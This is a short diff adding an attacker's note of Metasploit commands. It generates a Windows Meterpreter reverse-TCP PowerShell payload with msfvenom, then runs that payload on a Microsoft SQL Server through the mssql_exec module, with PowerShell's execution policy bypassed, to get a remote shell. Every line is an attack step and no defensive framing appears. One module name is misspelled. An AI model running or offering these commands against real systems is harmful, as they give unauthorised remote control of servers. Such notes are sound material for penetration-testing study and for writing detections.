@@ -1,0 +1,6 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<> LPORT=443 -f psh-reflection -o /root/pay.ps1
+
+msfconsole:
+1. Execute command via mssql
+use auxillary/admin/mssql/mssql_exec
+    set cmd "powershell -exec bypass -NoExit -File C:\\FTP\\pay.ps1" 
